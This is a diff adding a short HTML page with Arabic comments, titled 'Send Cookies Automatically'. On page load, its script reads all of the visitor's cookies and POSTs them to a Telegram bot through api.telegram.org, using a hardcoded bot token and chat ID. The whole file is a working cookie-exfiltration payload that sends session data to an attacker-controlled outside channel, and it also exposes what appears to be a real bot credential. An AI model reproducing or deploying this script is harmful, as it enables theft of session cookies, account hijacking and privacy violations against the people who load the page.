@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Cookies Automatically</title>
+    <script>
+        // وظيفة لإرسال الكوكيز إلى بوت Telegram تلقائيًا
+        async function sendCookiesToTelegram() {
+            try {
+                // الحصول على جميع الكوكيز
+                const cookies = document.cookie;
+
+                // التأكد من إدخال بيانات البوت
+                const botToken = "7867318181:AAFHSDLNLvdPFomn3HDxBbNCINP0LeDLHjw"; // ضع توكن البوت هنا
+                const chatId = "1832658980";    // ضع معرف الدردشة الخاص بك هنا
+
+                if (!botToken || !chatId) {
+                    console.error("تأكد من إضافة توكن البوت ومعرف الدردشة.");
+                    return;
+                }
+
+                // إعداد رابط API الخاص بتليجرام
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                // إعداد طلب الإرسال
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `Cookies: ${cookies}`,
+                    }),
+                });
+
+                // التحقق من نجاح الإرسال
+                if (response.ok) {
+                    console.log("تم إرسال الكوكيز إلى البوت بنجاح!");
+                } else {
+                    console.error("حدث خطأ أثناء الإرسال. تحقق من البيانات.");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+            }
+        }
+
+        // استدعاء الوظيفة تلقائيًا عند تحميل الصفحة
+        window.onload = sendCookiesToTelegram;
+    </script>
+</head>
+<body>
+    <h1>Sending Cookies...</h1>
+</body>
+</html>
